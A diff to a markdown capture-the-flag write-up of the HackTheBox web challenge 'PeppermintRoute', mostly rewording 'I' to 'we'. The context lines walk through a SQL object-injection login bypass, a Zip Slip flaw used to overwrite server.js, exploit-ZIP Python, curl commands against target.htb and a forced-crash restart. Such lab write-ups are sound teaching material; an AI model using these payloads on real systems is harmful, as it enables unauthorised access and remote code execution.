@@ -27,10 +27,8 @@ This medium-difficulty web challenge was really cool for combining multiple vuln
 When we first saw PeppermintRoute, we thought: "Okay, a Node.js web app for managing holiday package deliveries. Looks like a typical web challenge with some authentication and file upload functionality." Little did we know this would turn into one of the most elegant exploit chains we've done.
 
 **Quick Facts**:
-- **Platform**: HackTheBox (their web challenges are always well-designed)
 - **Difficulty**: Medium (turned out to be Medium-Hard with the twist)
 - **Tech Stack**: Node.js/Express + MySQL + custom ZIP parser
-- **Goal**: Get the HTB{flag} through remote code execution
 
 The app manages holiday deliveries with different user roles (admins, pilots, users) and lets you upload ZIP files for packages. Sounds innocent enough, right?
 
@@ -68,12 +66,12 @@ We knew we needed to find where the flag was stored. In HTB challenges, there ar
 2. **File system**: Often there's a `/readflag` binary
 3. **Environment variables**: Sometimes exposed through debug endpoints
 
-**What I Found**:
+**What We Found**:
 - **Flag Binary**: `/readflag` (setuid root - this is common in HTB)
 - **Ports**: 80 (nginx) → 3000 (Node.js internal)
 - **Database**: MySQL with role-based access (admin, pilot, user)
 
-**Why This Matters**: The setuid binary means any user can execute it to read the flag, but I need code execution on the server to call it.
+**Why This Matters**: The setuid binary means any user can execute it to read the flag, but we need code execution on the server to call it.
 
 ## Finding the First Vulnerability
 
@@ -81,9 +79,9 @@ We always start with the low-hanging fruit in web challenges: authentication. Le
 
 ### Starting with the Login Endpoint
 
-The first thing I tried was the obvious: basic SQL injection in the login form. But nothing worked. Then We looked at the source code (we had access to it locally for testing).
+The first thing we tried was the obvious: basic SQL injection in the login form. But nothing worked. Then we looked at the source code (we had access to it locally for testing).
 
-**What I Found in `authController.js`**:
+**What We Found in `authController.js`**:
 ```javascript
 const login = async (req, res) => {
     const { username, password } = req.body;  // This destructuring caught my eye
@@ -104,9 +102,9 @@ const login = async (req, res) => {
 
 ### The Object Injection Discovery
 
-I remembered a technique I read about in some security research. What if instead of strings, I send **objects** as the username and password?
+We remembered a technique we read about in some security research. What if instead of strings, we send **objects** as the username and password?
 
-**My Experiment**:
+**Our Experiment**:
 ```json
 {
     "username": {"username": 1},
@@ -132,20 +130,20 @@ if (!username || !password)  // Objects are truthy, so this passes!
 
 **Our Reaction**: "Holy crap, that actually worked!"
 
-**Resources I Referenced**:
+**Resources We Referenced**:
 - [Finding an unseen SQL Injection by bypassing escape functions in mysqljs/mysql](https://flatt.tech/research/posts/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql/)
 - MySQL2 library documentation on object serialization
 
 ### The File Upload Vulnerability: Zip Slip
 
-Now that I had admin access, I needed to find a way to execute code. File uploads are always suspicious, and this app had a custom ZIP parser. That screamed "Zip Slip vulnerability" to me.
+Now that we had admin access, we needed to find a way to execute code. File uploads are always suspicious, and this app had a custom ZIP parser. That screamed "Zip Slip vulnerability" to us.
 
-**My Investigation Process**:
-1. I looked at the file upload endpoint - it accepted ZIP files
+**Our Investigation Process**:
+1. We looked at the file upload endpoint - it accepted ZIP files
 2. Found the custom parser in `app/utils/zipParser.js`
 3. Analyzed the extraction logic
 
-**What I Found**:
+**What We Found**:
 ```javascript
 extractAll(destDir) {
     for (const entry of entries) {
@@ -175,7 +173,7 @@ const fullPath = path.resolve(destDir, zipName);
 **Why the Protection Failed**:
 The code only counted directory depth (`parts.length > 4`) but didn't check for `..` sequences. A path like `../../../server.js` has only 1 part after filtering, so it passes the check!
 
-**My "Eureka!" Moment**: "I can overwrite the main server.js file! If I replace it with malicious code, I get RCE!"
+**Our "Eureka!" Moment**: "We can overwrite the main server.js file! If we replace it with malicious code, we get RCE!"
 
 **Creating the Exploit ZIP**:
 ```python
@@ -207,20 +205,20 @@ with zipfile.ZipFile("exploit.zip", "w") as z:
 
 ## Putting It All Together: The Complete Exploit Chain
 
-Now came the fun part: combining these vulnerabilities. But I ran into a problem - Node.js caches modules, so even after overwriting `server.js`, the running server wouldn't reload it.
+Now came the fun part: combining these vulnerabilities. But we ran into a problem - Node.js caches modules, so even after overwriting `server.js`, the running server wouldn't reload it.
 
-**My Initial Failed Attempts**:
+**Our Initial Failed Attempts**:
 1. Just overwrite `server.js` and hope for reload → Didn't work (caching)
 2. Try to crash the server with various payloads → Nothing worked
 3. Look for admin restart buttons → None found
 
-**The Breakthrough**: I needed a way to force a clean server restart. That's when I discovered the "controlled crash" technique.
+**Our Breakthrough**: We needed a way to force a clean server restart. That's when we discovered the "controlled crash" technique.
 
 ### Step-by-Step Exploitation
 
 #### Step 1: Get Admin Access (Auth Bypass)
 ```bash
-# This was the easy part now that I understood the vulnerability
+# This was the easy part now that we understood the vulnerability
 curl -X POST http://target.htb/login \
   -H "Content-Type: application/json" \
   -c admin_cookies.txt \
@@ -230,7 +228,7 @@ curl -X POST http://target.htb/login \
 
 #### Step 2: Get a Pilot User (Need User-Level Access)
 ```bash
-# I need a "user" role to access certain endpoints
+# We need a "user" role to access certain endpoints
 PILOT=$(curl -s -b admin_cookies.txt "http://target.htb/api/admin/pilots-data" \
   | jq -r '.pilots[0].username')
 ```
@@ -280,7 +278,7 @@ with zipfile.ZipFile("exploit.zip", "w") as z:
     z.writestr("crash/", b"")                      # Empty directory entry
 ```
 
-**Why the directory entry?** I discovered that when users try to download files, the server uses `fs.createReadStream()`. If the "file" is actually a directory, it causes an unhandled error that crashes Node.js.
+**Why the directory entry?** We discovered that when users try to download files, the server uses `fs.createReadStream()`. If the "file" is actually a directory, it causes an unhandled error that crashes Node.js.
 
 #### Step 6: Upload the Malicious ZIP
 ```bash
@@ -340,7 +338,7 @@ Node.js caches required modules. When you do `require('./server.js')`, it loads 
 
 We discovered this by accident while testing file downloads. Here's what happens:
 
-**In the file download code (I assume this is what it looks like)**:
+**In the file download code (we assume this is what it looks like)**:
 ```javascript
 app.get('/download', (req, res) => {
   const filePath = getFilePath(req.query.fileId);
